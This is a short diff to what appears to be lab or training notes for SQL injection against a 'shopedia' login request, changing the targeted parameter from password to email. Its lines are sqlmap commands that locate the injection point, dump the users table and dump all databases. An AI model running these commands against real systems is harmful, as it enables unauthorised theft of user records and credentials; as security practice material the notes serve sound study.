@@ -24,19 +24,19 @@
 #-------------------------------------------------------------
 
 # To find the injection point
-sqlmap -r shopedia-login.post -p password
+sqlmap -r shopedia-login.post -p email
 # type "y" to all
 # type "n" fo the "testing the others(if any)" prompt if you do not want to continue with other parameters
 
 # Find out the tables in the current database
-sqlmap -r shopedia-login.post -p password --dump
+sqlmap -r shopedia-login.post -p email --dump
 
 # Dump records within a specified table of the specified database
-sqlmap -r shopedia-login.post -p password -D shopedia -T users --dump
+sqlmap -r shopedia-login.post -p email -D shopedia -T users --dump
 
 # Dump all the tables in all databases
 # Will take a while
-sqlmap -r shopedia-login.post -p password  --dump-all
+sqlmap -r shopedia-login.post -p email  --dump-all
 
 # Depending on the type of error found, the database dump may take a varying amount of time.
 
